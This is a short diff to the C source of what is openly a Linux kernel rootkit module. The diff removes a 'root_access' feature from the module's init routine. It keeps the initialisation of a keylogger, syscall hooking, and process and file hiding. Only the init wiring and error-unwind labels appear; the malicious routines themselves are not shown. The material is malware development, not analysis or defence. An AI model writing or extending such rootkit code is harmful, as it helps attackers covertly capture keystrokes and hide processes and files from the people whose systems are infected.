@@ -8,7 +8,6 @@
 #include "keylogger.h"
 #include "etc.h"
 #include "hooking.h"
-#include "root_access.h"
 #include "hide_proc.h"
 #include "hide_file.h"
 
@@ -35,8 +34,6 @@ static int __init rootkit_init(void) {
 	if (status) goto fops;
 	status = init_keylogger();
 	if (status) goto keylogger;
-	status = init_root_access();
-	if (status) goto root_access;
 
 	if (pid) {
 		status = init_hide_proc(pid);
@@ -56,8 +53,7 @@ static int __init rootkit_init(void) {
 
 	hook:
 	hide_file:		exit_hooking();
-	hide_proc:
-	root_access:	exit_keylogger();
+	hide_proc:		exit_keylogger();
 	keylogger:		exit_fops();
 	fops:			return status;
 }
